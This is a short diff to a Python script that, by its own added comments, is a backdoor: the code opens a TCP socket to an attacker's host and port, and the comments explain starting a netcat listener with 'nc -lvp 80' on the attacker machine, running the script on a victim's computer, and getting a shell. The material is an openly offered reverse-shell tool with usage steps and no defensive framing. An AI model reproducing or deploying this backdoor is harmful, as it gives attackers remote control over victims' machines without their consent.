@@ -55,7 +55,11 @@ ob = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP SOCKET INITIALISATI
 ob.connect((hostip,port))
 Login()		
 
-#happy hacking
-		
+# to test the backdoor run this python script on the victim's machine after executing the netcat listner on your(as attacker) machine 
+# first start a listner by command nc -lvp 80 on attacker machine 
+# then run this script on the victims's computer
+# you wil get a shell!!!:>>
+
+#HAPPY HACKING 
 	
 	
